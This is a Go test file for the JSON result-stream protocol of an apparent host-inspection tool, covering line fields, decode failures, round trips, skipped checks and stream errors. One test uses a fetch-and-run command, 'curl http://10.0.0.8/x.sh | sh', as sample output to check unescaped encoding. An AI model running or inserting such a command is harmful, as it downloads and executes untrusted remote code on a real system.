// The collector protocol's own tests: the line's shape (the field names are the
// contract), what a reader refuses, and the round trip that matters — a run's
// results collected as JSON and read back must be the results, the documents
// included.

package collect

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"

	"karma/internal/model"
	"karma/internal/runner"
	"karma/internal/session"
)

// fixtureCatalog is one check per way a walk can end: an answered body with a
// rule that lights a line, a two-tier fallback, a walk whose only tier the host
// lacks, and a tier that answers with nothing at all.
func fixtureCatalog() []*model.Check {
	answer := func(text string) model.Native {
		return model.Native{Body: func(context.Context) (string, error) { return text, nil }}
	}
	unavailable := model.Native{Body: func(context.Context) (string, error) { return "", model.ErrTierUnavailable }}
	return []*model.Check{
		{
			ID: "answered", Title: "Answered", Aspect: model.AspectSystem, Platform: model.Linux,
			Steps: []model.Step{{{Label: "ss", Inv: answer("== a\none two three\n")}}},
			Rules: []model.Rule{model.NewRule("two", `two`, model.High, "a two")},
		},
		{
			ID: "fallback", Title: "Fallback", Aspect: model.AspectNetwork, Platform: model.Linux,
			Steps: []model.Step{
				{{Label: "ss", Inv: unavailable}},
				{{Label: "netstat", Inv: answer("== b\nkept\n")}},
			},
		},
		{
			ID: "absent", Title: "Absent", Aspect: model.AspectKernel, Platform: model.Linux,
			Steps: []model.Step{{{Label: "gone", Inv: unavailable}}},
		},
		{
			ID: "quiet", Title: "Quiet", Aspect: model.AspectLog, Platform: model.Linux,
			Steps: []model.Step{{{Label: "quiet", Inv: answer("")}}},
		},
		{
			// The stages a tier's text can pass through on the way to a panel: the
			// tier's own join (Assemble), its dialect alignment (Adapt) and the
			// check's normalization. A reader of the stream has to run all three
			// itself, which is what this check is here to prove.
			ID: "joined", Title: "Joined", Aspect: model.AspectKernel, Platform: model.Linux,
			Steps: []model.Step{{{Label: "diff", Inv: answer("A one\nS two size 1\n"), Assemble: func(stream string) string {
				return "joined\n" + strings.ReplaceAll(strings.TrimSuffix(stream, "\n"), "\n", "\njoined\n")
			}, Adapt: func(title, body string) *model.Shaped {
				return &model.Shaped{Text: strings.ToUpper(body)}
			}}}},
			Normalize: func(title, body string) *model.Shaped {
				return &model.Shaped{Text: body + "shaped\n"}
			},
		},
	}
}

// capturing is the observer that keeps the results a run produced, in the order
// the checks finished.
type capturing struct {
	mu      sync.Mutex
	results []*model.CheckResult
}

func (o *capturing) CheckStarted(*model.Check) {}

func (o *capturing) CheckFinished(_ *model.Check, result *model.CheckResult) {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.results = append(o.results, result)
}

func (o *capturing) Damaged(*model.Check, error) {}

// runOnce runs one catalog once, with the observer given. Both halves of the
// round trip use the same catalog value, so a result's Check pointer is the same
// one on both sides and the comparison is about the result, not the fixture.
func runOnce(t *testing.T, catalog []*model.Check, observer runner.Observer) {
	t.Helper()
	options := model.RunOptions{Concurrency: 4, Timeout: 5 * time.Second}
	summary := runner.RunCatalog(context.Background(), session.LocalSession{}, catalog, options, observer)
	if summary.Results != len(catalog) {
		t.Fatalf("the run produced %d results, want %d", summary.Results, len(catalog))
	}
}

func TestTheStreamNamesEveryFieldOfAResult(t *testing.T) {
	line, err := Of(&model.CheckResult{
		Check:         &model.Check{ID: "listen"},
		ProbeLabel:    "ss",
		SkippedLabels: []string{"ss"},
		Outcome:       model.Collected,
		Raw:           "== a\none\n",
		Stderr:        "a warning\n",
		Note:          "exit code 1",
		Document:      model.Document{Truncated: true},
	}).Line()
	if err != nil {
		t.Fatalf("the line could not be built: %v", err)
	}
	want := `{"check":"listen","outcome":"collected","probe":"ss","skipped":["ss"],` +
		`"raw":"== a\none\n","stderr":"a warning\n","note":"exit code 1","truncated":true}` + "\n"
	if string(line) != want {
		t.Errorf("the line is\n%s\nwant\n%s", line, want)
	}
}

// A target's own output travels as it is: the angles and ampersands a shell
// pipeline prints are not JSON escapes.
func TestTheLineKeepsTheTextAsItIs(t *testing.T) {
	line, err := Of(&model.CheckResult{
		Check:   &model.Check{ID: "shell-rc"},
		Outcome: model.Collected,
		Raw:     "curl http://10.0.0.8/x.sh | sh && echo <done>\n",
	}).Line()
	if err != nil {
		t.Fatalf("the line could not be built: %v", err)
	}
	if !strings.Contains(string(line), "&& echo <done>") {
		t.Errorf("the text should travel unescaped, got %s", line)
	}
}

func TestDecodeRejectsALineThatIsNotAnObject(t *testing.T) {
	for _, line := range []string{"", "not json\n", "[1,2]\n", "{}\n{\"check\":\"x\"}\n"} {
		if _, err := Decode([]byte(line)); err == nil {
			t.Errorf("Decode(%q) should fail", line)
		}
	}
}

// The round trip: what a run drew for itself and what the same run's stream
// reads back into must be the same results, document included — this is the
// property the whole protocol exists for.
func TestARunAndItsStreamAgree(t *testing.T) {
	catalog := fixtureCatalog()
	direct := &capturing{}
	runOnce(t, catalog, direct)

	var stream bytes.Buffer
	runOnce(t, catalog, NewWriter(&stream))

	options := model.RunOptions{Concurrency: 4, Timeout: 5 * time.Second}
	decoded, err := decodeAll(&stream, catalog, options)
	if err != nil {
		t.Fatalf("the stream could not be read back: %v", err)
	}
	if len(decoded) != len(direct.results) {
		t.Fatalf("the stream carried %d results, the run produced %d", len(decoded), len(direct.results))
	}
	byID := map[string]*model.CheckResult{}
	for _, result := range direct.results {
		byID[result.Check.ID] = result
	}
	for _, result := range decoded {
		want, ok := byID[result.Check.ID]
		if !ok {
			t.Fatalf("the stream names a check the run did not produce: %s", result.Check.ID)
		}
		if !reflect.DeepEqual(result, want) {
			t.Errorf("check %s reads back as\n%+v\nwant\n%+v", result.Check.ID, result, want)
		}
	}
}

func decodeAll(r *bytes.Buffer, catalog []*model.Check, options model.RunOptions) ([]*model.CheckResult, error) {
	var out []*model.CheckResult
	scanner := bufio.NewScanner(r)
	scanner.Buffer(make([]byte, 0, 64<<10), 64<<20)
	for scanner.Scan() {
		line, err := Decode(scanner.Bytes())
		if err != nil {
			return nil, err
		}
		result, err := ToCheckResult(catalog, line, options)
		if err != nil {
			return nil, err
		}
		out = append(out, result)
	}
	return out, scanner.Err()
}

func TestToCheckResultRefusesWhatItCannotResolve(t *testing.T) {
	catalog := fixtureCatalog()
	options := model.RunOptions{}
	cases := []struct {
		name string
		r    Result
	}{
		{"unknown check", Result{Check: "nope", Outcome: model.Collected.String(), Probe: "ss"}},
		{"unknown outcome", Result{Check: "answered", Outcome: "maybe", Probe: "ss"}},
		{"unknown tier", Result{Check: "answered", Outcome: model.Collected.String(), Probe: "grep"}},
	}
	for _, tc := range cases {
		if _, err := ToCheckResult(catalog, tc.r, options); err == nil {
			t.Errorf("%s: ToCheckResult should fail", tc.name)
		}
	}
}

// A skipped check carries the chain it walked and no tier, and reads back as a
// skipped result: the panel layer prints nothing for it, which is what a check
// the host cannot answer looks like.
func TestASkippedCheckTravelsWithoutATier(t *testing.T) {
	catalog := fixtureCatalog()
	var stream bytes.Buffer
	runOnce(t, catalog, NewWriter(&stream))
	decoded, err := decodeAll(&stream, catalog, model.RunOptions{})
	if err != nil {
		t.Fatalf("the stream could not be read back: %v", err)
	}
	for _, result := range decoded {
		if result.Check.ID != "absent" {
			continue
		}
		if result.Outcome != model.Skipped || result.ProbeLabel != "" {
			t.Fatalf("a walk with no tier for this host: %+v", result)
		}
		if !reflect.DeepEqual(result.SkippedLabels, []string{"gone"}) {
			t.Fatalf("the chain should travel: %v", result.SkippedLabels)
		}
		return
	}
	t.Fatal("the absent check is missing from the stream")
}

// A stream whose writer fails stops: the first error is kept and reported, and
// no line after it is written.
type failingWriter struct {
	mu    sync.Mutex
	lines int
}

var errStreamClosed = errors.New("the stream is gone")

func (w *failingWriter) Write(p []byte) (int, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.lines++
	return 0, errStreamClosed
}

func TestAWriterThatFailsEndsTheStream(t *testing.T) {
	target := &failingWriter{}
	writer := NewWriter(target)
	runOnce(t, fixtureCatalog(), writer)
	if !errors.Is(writer.Err(), errStreamClosed) {
		t.Fatalf("the run should report the failed stream, got %v", writer.Err())
	}
	if target.lines != 1 {
		t.Fatalf("writes after the first failure are pointless, got %d writes", target.lines)
	}
}

// The damaged path names the check: a check whose presentation broke is a failed
// result in the stream, not a check that never arrives.
func TestDamagedWritesAFailedResult(t *testing.T) {
	var stream bytes.Buffer
	writer := NewWriter(&stream)
	writer.Damaged(&model.Check{ID: "boom"}, errors.New("presentation: the writer blew up"))
	line, err := Decode(stream.Bytes())
	if err != nil {
		t.Fatalf("the line could not be read: %v", err)
	}
	if line.Check != "boom" || line.Outcome != model.Failed.String() ||
		!strings.Contains(line.Note, "the writer blew up") {
		t.Fatalf("a damaged check came out as %+v", line)
	}
}
